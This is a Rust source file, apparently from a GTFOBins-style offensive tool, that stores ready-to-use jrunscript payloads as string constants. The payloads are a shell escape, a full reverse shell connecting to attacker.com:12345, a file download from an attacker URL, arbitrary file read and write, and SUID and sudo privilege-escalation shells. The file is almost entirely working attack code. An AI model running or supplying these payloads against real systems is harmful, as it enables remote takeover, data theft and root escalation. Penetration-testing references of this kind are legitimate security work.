pub static BIN_NAME: &'static str = "jrunscript";
pub static BIN_DESC: &'static str = "This tool is installed starting with Java SE 6.";
pub static SH_CODE: &'static str = r#"

    jrunscript -e "exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')"
"#;
pub static RS_DESC: &'static str = "Run `nc -l -p 12345` on the attacker box to receive the shell.";
pub static RS_CODE: &'static str = r#"
    
    export RHOST=attacker.com
    export RPORT=12345
    jrunscript -e 'var host='"'""$RHOST""'"'; var port='"$RPORT"';
    var p=new java.lang.ProcessBuilder("/bin/bash", "-i").redirectErrorStream(true).start();
    var s=new java.net.Socket(host,port);
    var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
    var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){
    while(pi.available()>0)so.write(pi.read());
    while(pe.available()>0)so.write(pe.read());
    while(si.available()>0)po.write(si.read());
    so.flush();po.flush();
    java.lang.Thread.sleep(50);
    try {p.exitValue();break;}catch (e){}};p.destroy();s.close();'
"#;
pub static FD_DESC: &'static str = "Fetch a remote file via HTTP GET request.";
pub static FD_CODE: &'static str = r#"
    
    URL=http://attacker.com/file_to_get
    LFILE=file_to_save
    jrunscript -e "cp('$URL','$LFILE')"
"#;
pub static FW_CODE: &'static str = r#"
    
    jrunscript -e 'var fw=new java.io.FileWriter("./file_to_write"); fw.write("DATA"); fw.close();'
"#;
pub static FR_CODE: &'static str = r#"
    
    jrunscript -e 'br = new BufferedReader(new java.io.FileReader("file_to_read")); while ((line = br.readLine()) != null) { print(line); }'
"#;
pub static SUID_DESC: &'static str =
    "This has been found working in macOS but failing on Linux systems.";
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which jrunscript) .

    ./jrunscript -e "exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)')"
"#;
pub static SUDO_CODE: &'static str = r#"
    
    sudo jrunscript -e "exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')"
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code {
    title: "SH_CODE",
    code: SH_CODE,
    tag: Tag::SH,
};
pub static RS: Code<'static> = Code {
    title: "RS_CODE",
    code: RS_CODE,
    tag: Tag::RS,
};
pub static FD: Code<'static> = Code {
    title: "FD_CODE",
    code: FD_CODE,
    tag: Tag::FD,
};
pub static FW: Code<'static> = Code {
    title: "FW_CODE",
    code: FW_CODE,
    tag: Tag::FW,
};
pub static FR: Code<'static> = Code {
    title: "FR_CODE",
    code: FR_CODE,
    tag: Tag::FR,
};
pub static SUID: Code<'static> = Code {
    title: "SUID_CODE",
    code: SUID_CODE,
    tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code {
    title: "SUDO_CODE",
    code: SUDO_CODE,
    tag: Tag::SUDO,
};
